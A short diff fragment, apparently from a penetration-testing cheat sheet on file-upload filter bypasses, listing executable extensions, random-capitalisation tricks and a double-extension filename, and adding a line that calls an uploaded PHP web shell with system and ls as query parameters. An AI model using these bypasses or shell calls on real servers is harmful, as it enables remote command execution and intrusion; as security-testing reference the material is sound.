@@ -8,6 +8,8 @@ Coldfusion → .cfm, .cfml, .cfc, .dbm
 Perl → .pl, .cgi
 # Using random capitalization → .pHp, .pHP5, .PhAr
 
+#http://target.com/path/to/shell.php?__=system&___=ls
+
 
 # Whitelisting Bypass
 file.png.php
